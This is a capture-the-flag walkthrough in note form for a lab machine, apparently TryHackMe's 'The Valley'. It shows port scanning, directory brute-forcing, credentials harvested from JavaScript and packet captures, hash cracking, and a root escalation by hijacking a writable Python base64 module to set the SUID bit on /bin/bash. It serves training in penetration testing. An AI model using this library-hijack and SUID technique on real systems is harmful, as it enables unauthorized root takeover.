# Info

## IP = $IP

## Creds
- valleyDev:ph0t0s1234
- siemDev:california
- valley:liberty123

# Ports

## 22
```
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c2842ac1225a10f16616dda0f6046295 (RSA)
|   256 429e2ff63e5adb51996271c48c223ebb (ECDSA)
|_  256 2ea0a56cd983e0016cb98a609b638672 (ED25519)
```

## 80
```
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
```

### Web Exploiting
- Sell images

### URLs
- http://$IP/pricing/pricing.html
- http://$IP/static/18
- http://$IP/gallery/gallery.html
- _static_ has a id...

### `gobuster` on _http://$IP/static_
- http://$IP/static/00
```
dev notes from valleyDev:
-add wedding photo examples
-redo the editing on #4
-remove /dev1243224123123
-check for SIEM alerts
```

### checking new dir
- _http://$IP/dev1243224123123/_
- login page
- in _dev.js_ file, I found another path
    ```
        if (username === "siemDev" && password === "california") {
        window.location.href = "/dev1243224123123/devNotes37370.txt";
    ```
    - /dev1243224123123/devNotes37370.txt
    ```
    dev notes for ftp server:
    -stop reusing credentials
    -check for any vulnerabilies
    -stay up to date on patching
    -change ftp port to normal port
    ```

## Searching for _FTP server_
- `nmap -p- -T5 $IP`
- port is the devNotes number (37370)

## 37370
- 3 wireshark files
- in _siemHTTP2_
```
uname=valleyDev&psw=ph0t0s1234&remember=on
``` 
- creds for login via `ssh`


# PrivEsc

## in _/var/www/html/dev1243224123123/old;js_
```
const users = {
  "john": {
    username: "john",
    password: "replace",
    email: "john@example.com",
    age: 25,
    country: "USA"
  },
  "jane": {
    username: "jane",
    password: "replace",
    email: "jane@example.com",
    age: 30,
    country: "Canada"
  },
  "bob": {
    username: "bob",
    password: "replace",
    email: "bob@example.com",
    age: 40,
    country: "UK"
  }
};
```

## looking for _/home/valleyAuthenticator_
- transfering to attacker's machine
```
┌──(kali㉿kali)-[~/Desktop/CTFs/tryhackme/TheValley]
└─$ strings valleyAuthenticator | grep -i pass -B 15 -A 15
p9dJ
kx!S
;B@l
~`g{
xpbT
A [3    <
?ATs
-^;x&
e6722920bab2326f8217e4
```

- _https://crackstation.net/_ for _e6722920bab2326f8217e4_: `liberty123`

## after changing for `valley`'s account
- interesting file: _photosEncrypt.py_, owned by root
- import _base64_ is a module that is writeable...
```
valley@valley:~$ ls -la /usr/lib/python3.8/base64.py 
-rwxrwxr-x 1 root valleyAdmin 20382 Mar 13  2023 /usr/lib/python3.8/base64.py
```
- write this file to:
```python
#! /usr/bin/python3.8

import os
os.system('chmod u+s /bin/bash') 
```
```bash
valley@valley:~/Desktop$ python3 /photos/script/photosEncrypt.py
chmod: changing permissions of '/bin/bash': Operation not permitted
Hello world!
Traceback (most recent call last):
  File "/photos/script/photosEncrypt.py", line 18, in <module>
    with open(output_path, "wb") as output_file:
PermissionError: [Errno 13] Permission denied: '/photos/photoVault/p1.enc'
Error in sys.excepthook:
Traceback (most recent call last):
  File "/usr/lib/python3/dist-packages/apport_python_hook.py", line 72, in apport_excepthook
    from apport.fileutils import likely_packaged, get_recent_crashes
  File "/usr/lib/python3/dist-packages/apport/__init__.py", line 5, in <module>
    from apport.report import Report
  File "/usr/lib/python3/dist-packages/apport/report.py", line 21, in <module>
    from urllib.request import urlopen
  File "/usr/lib/python3.8/urllib/request.py", line 88, in <module>
    import http.client
  File "/usr/lib/python3.8/http/client.py", line 71, in <module>
    import email.parser
  File "/usr/lib/python3.8/email/parser.py", line 12, in <module>
    from email.feedparser import FeedParser, BytesFeedParser
  File "/usr/lib/python3.8/email/feedparser.py", line 27, in <module>
    from email._policybase import compat32
  File "/usr/lib/python3.8/email/_policybase.py", line 7, in <module>
    from email import header
  File "/usr/lib/python3.8/email/header.py", line 20, in <module>
    from email import charset as _charset
  File "/usr/lib/python3.8/email/charset.py", line 18, in <module>
    from email.encoders import encode_7or8bit
  File "/usr/lib/python3.8/email/encoders.py", line 15, in <module>
    from base64 import encodebytes as _bencode
ImportError: cannot import name 'encodebytes' from 'base64' (/usr/lib/python3.8/base64.py)

Original exception was:
Traceback (most recent call last):
  File "/photos/script/photosEncrypt.py", line 18, in <module>
    with open(output_path, "wb") as output_file:
PermissionError: [Errno 13] Permission denied: '/photos/photoVault/p1.enc'

valley@valley:~/Desktop$ /bin/bash -p
bash-5.0# whoami
root
```